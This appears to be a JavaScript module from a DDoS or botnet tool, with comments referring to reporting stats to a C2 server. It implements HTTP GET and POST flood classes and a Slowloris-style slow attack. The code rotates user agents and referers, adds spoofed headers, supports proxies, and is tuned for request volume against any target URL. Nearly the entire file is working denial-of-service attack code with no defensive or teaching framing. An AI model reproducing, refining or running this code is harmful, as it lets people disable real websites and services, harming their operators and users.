import http from 'http';
import https from 'https';
import { URL } from 'url';
import { Tools } from '../../utils/tools.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
import { logger } from '../../utils/logger.js';

/**
 * HTTP/1.1 GET Flood Attack
 */
export class HTTPGetFlood {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        try {
            this.url = new URL(targetUrl);
        } catch (err) {
            logger.error(`Invalid URL: ${targetUrl}`);
            throw new Error(`Invalid target URL: ${err.message}`);
        }
        this.duration = duration;
        this.rpc = rpc;
        this.userAgents = userAgents;
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
        
        // Stats tracking for C2
        this.stats = {
            totalRequests: 0,
            successfulRequests: 0,
            failedRequests: 0,
            totalBytes: 0,
            totalPackets: 0
        };
    }

    async start() {
        try {
            const endTime = Date.now() + (this.duration * 1000);

            while (Date.now() < endTime && this.active) {
                try {
                    await this.attack();
                } catch (err) {
                    logger.debug(`Attack iteration error: ${err.message}`);
                    // Continue attacking even if one iteration fails
                }
            }
        } catch (err) {
            logger.error(`HTTP GET Flood error: ${err.message}`);
            this.active = false;
        }
    }

    generateHeaders() {
        const headers = {
            'Host': this.url.host,
            'User-Agent': this.userAgents.length > 0 
                ? Tools.randomChoice(this.userAgents)
                : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Sec-Gpc': '1',
            'Pragma': 'no-cache',
            ...Tools.generateSpoofHeaders(this.url.host)
        };

        if (this.referers.length > 0) {
            headers['Referer'] = Tools.randomChoice(this.referers) + this.url.href;
        }

        return headers;
    }

    async attack() {
        return new Promise((resolve) => {
            try {
                // BUG FIX: Add agent for connection pooling and reuse
                const protocol = this.url.protocol === 'https:' ? https : http;
                const agent = new protocol.Agent({
                    keepAlive: true,
                    keepAliveMsecs: 1000,
                    maxSockets: this.rpc * 2, // Allow more concurrent sockets
                    maxFreeSockets: this.rpc,
                    timeout: 5000,
                    scheduling: 'lifo' // Use last-in-first-out for better performance
                });

                const options = {
                    hostname: this.url.hostname,
                    port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
                    path: this.url.pathname + this.url.search,
                    method: 'GET',
                    headers: this.generateHeaders(),
                    timeout: 900,
                    agent: agent // BUG FIX: Use agent for connection reuse
                };

                const makeRequest = () => {
                    if (!this.active) {
                        resolve();
                        return;
                    }

                    try {
                        this.stats.totalRequests++;
                        const req = protocol.request(options, (res) => {
                            REQUESTS_SENT.add(1);
                            this.stats.successfulRequests++;
                            this.stats.totalPackets++;
                            
                            res.on('data', (chunk) => {
                                this.stats.totalBytes += chunk.length;
                            });
                            res.on('end', () => {});
                            res.on('error', () => {
                                this.stats.failedRequests++;
                            });
                        });

                        req.on('error', () => {
                            this.stats.failedRequests++;
                        });
                        
                        req.on('timeout', () => {
                            this.stats.failedRequests++;
                            try {
                                req.destroy();
                            } catch (e) {}
                        });

                        req.end();
                        const headerSize = JSON.stringify(options.headers).length;
                        BYTES_SENT.add(headerSize);
                        this.stats.totalBytes += headerSize;
                    } catch (err) {
                        this.stats.failedRequests++;
                    }
                };

                for (let i = 0; i < this.rpc; i++) {
                    makeRequest();
                }

                setTimeout(resolve, 100);
            } catch (err) {
                logger.debug(`Attack request error: ${err.message}`);
                resolve();
            }
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * HTTP/1.1 POST Flood Attack
 */
export class HTTPPostFlood extends HTTPGetFlood {
    generatePayload() {
        return JSON.stringify({
            data: Tools.randomString(32)
        });
    }

    async attack() {
        return new Promise((resolve) => {
            try {
                const payload = this.generatePayload();
                const headers = this.generateHeaders();
                headers['Content-Type'] = 'application/json';
                headers['Content-Length'] = Buffer.byteLength(payload);
                headers['X-Requested-With'] = 'XMLHttpRequest';

                // BUG FIX: Add agent for connection pooling and reuse
                const protocol = this.url.protocol === 'https:' ? https : http;
                const agent = new protocol.Agent({
                    keepAlive: true,
                    keepAliveMsecs: 1000,
                    maxSockets: this.rpc * 2,
                    maxFreeSockets: this.rpc,
                    timeout: 5000,
                    scheduling: 'lifo'
                });

                const options = {
                    hostname: this.url.hostname,
                    port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
                    path: this.url.pathname + this.url.search,
                    method: 'POST',
                    headers: headers,
                    timeout: 900,
                    agent: agent // BUG FIX: Use agent for connection reuse
                };

                const makeRequest = () => {
                    if (!this.active) {
                        resolve();
                        return;
                    }

                    try {
                        const req = protocol.request(options, (res) => {
                            REQUESTS_SENT.add(1);
                            res.on('data', () => {});
                            res.on('end', () => {});
                            res.on('error', () => {}); // Handle response errors
                        });

                        req.on('error', () => {}); // Silently handle request errors
                        req.on('timeout', () => {
                            try {
                                req.destroy();
                            } catch (e) {}
                        });

                        req.write(payload);
                        req.end();
                        
                        BYTES_SENT.add(Buffer.byteLength(payload) + JSON.stringify(options.headers).length);
                    } catch (err) {
                        // Silently continue on request creation error
                    }
                };

                for (let i = 0; i < this.rpc; i++) {
                    makeRequest();
                }

                setTimeout(resolve, 100);
            } catch (err) {
                logger.debug(`POST attack error: ${err.message}`);
                resolve();
            }
        });
    }
}

/**
 * HTTP Slow Attack (Slowloris)
 */
export class HTTPSlowAttack {
    constructor(targetUrl, duration, userAgents = [], proxies = null) {
        try {
            this.url = new URL(targetUrl);
        } catch (err) {
            logger.error(`Invalid URL: ${targetUrl}`);
            throw new Error(`Invalid target URL: ${err.message}`);
        }
        this.duration = duration;
        this.userAgents = userAgents;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        try {
            const endTime = Date.now() + (this.duration * 1000);

            while (Date.now() < endTime && this.active) {
                try {
                    await this.attack();
                } catch (err) {
                    logger.debug(`Slow attack iteration error: ${err.message}`);
                }
            }
        } catch (err) {
            logger.error(`HTTP Slow Attack error: ${err.message}`);
            this.active = false;
        }
    }

    async attack() {
        return new Promise((resolve) => {
            try {
                const protocol = this.url.protocol === 'https:' ? https : http;
                const port = this.url.port || (this.url.protocol === 'https:' ? 443 : 80);

                const socket = protocol.request({
                    hostname: this.url.hostname,
                    port: port,
                    method: 'GET',
                    path: this.url.pathname + this.url.search,
                    headers: {
                        'User-Agent': this.userAgents.length > 0 
                            ? Tools.randomChoice(this.userAgents)
                            : 'Mozilla/5.0',
                        'Accept': 'text/html'
                    }
                });

                const keepAlive = setInterval(() => {
                    if (!this.active) {
                        clearInterval(keepAlive);
                        try {
                            socket.destroy();
                        } catch (e) {}
                        resolve();
                        return;
                    }

                    try {
                        socket.write(`X-a: ${Tools.randomInt(1, 5000)}\r\n`);
                        BYTES_SENT.add(20);
                    } catch (e) {
                        clearInterval(keepAlive);
                        try {
                            socket.destroy();
                        } catch (e2) {}
                        resolve();
                    }
                }, 1000);

                socket.on('error', () => {
                    clearInterval(keepAlive);
                    resolve();
                });

                socket.on('timeout', () => {
                    clearInterval(keepAlive);
                    try {
                        socket.destroy();
                    } catch (e) {}
                    resolve();
                });

                socket.end();
            } catch (err) {
                logger.debug(`Slow attack socket error: ${err.message}`);
                resolve();
            }
        });
    }

    stop() {
        this.active = false;
    }
}
